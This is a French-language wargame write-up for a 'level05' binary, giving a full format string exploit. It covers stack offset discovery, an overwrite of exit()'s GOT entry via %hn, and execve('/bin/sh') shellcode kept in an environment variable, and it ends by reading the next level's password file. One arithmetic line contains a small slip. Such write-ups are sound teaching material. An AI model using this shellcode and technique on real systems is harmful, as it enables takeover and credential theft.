il y a un printf non protege dans le code source, on peut donc faire une format string attack

On trouve d'abord a quelle adresse de la stack se situe notre buffer avec %x

python -c 'print "eeee" + " %x"*13' > /tmp/test

cat /tmp/test | ./level05

on obtient :

eeee 64 f7fcfac0 0 0 0 0 ffffffff ffffd764 f7fdb000 65656565 20782520 25207825 78252078

notre buffer est donc a la 10eme place de la stack

On va passer par la table GOT pour rediriget le exit() vers un shell code
Nous allons donc trouver l'adresse de exit() dans la table GOT

(gdb) disas exit

0x08048370 <+0>:	jmp    *0x80497e0
0x08048376 <+6>:	push   $0x18
0x0804837b <+11>:	jmp    0x8048330

donc l'addresse de exit() dans la GOT est 0x80497e0

on va mettre un shellcode dans l'env et voir son adresse

env -i payload=$(python -c 'print "\x90"*500+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"') gdb ./level05

(gdb) b main
(gdb) r
(gdb) x/500s environ

20\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
0xffffde4e:	 "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220

on va donc prendre 0xffffde4e

il va falloir mettre cette adresse la dans le exit() de GOT

on va le faire grace au printf()

l'addresse du shellcode 0xffffde4e equivaut a 4294958670 en decimal, on ne pourra jamais le print on va donc diviser l'adresse
en du exit en 2 pour d'abord placer de4e et ensuite ffff respectivement dans 0x80497e0 puis 0x80497e2 (0x80497e0 + 2 car de4e c'est 2 octet)

de4e = 56910
ffff = 65535

on va utiliser le symbole %hn dans printf qui permet de d'ecrire par 2 octet le nombre de caractere

sachant qu'on va deja ecrire deux adresses dans le printf au debut ce qui fait 8 octets donc 56910 - 2 = 56902

et comme le compteur de caractere ne repart pas de 0 on doit soustraire pour savoir le nombre de caractere a ajouter

65535 - 56910 = 8625

avec cette manipulation on va ecrire x4e\xde dans l'adresse 0x80497e0 et xff\xff a l'adresse 0x80497e2

on creer le payload : 

python -c "print '\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%56902d%10\$hn' + '%8625d%11\$hn'" > /tmp/exploit

cat /tmp/exploit - | env -i payload=$(python -c 'print "\x90"*500+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"') ./level05

cat /home/users/level06/.pass






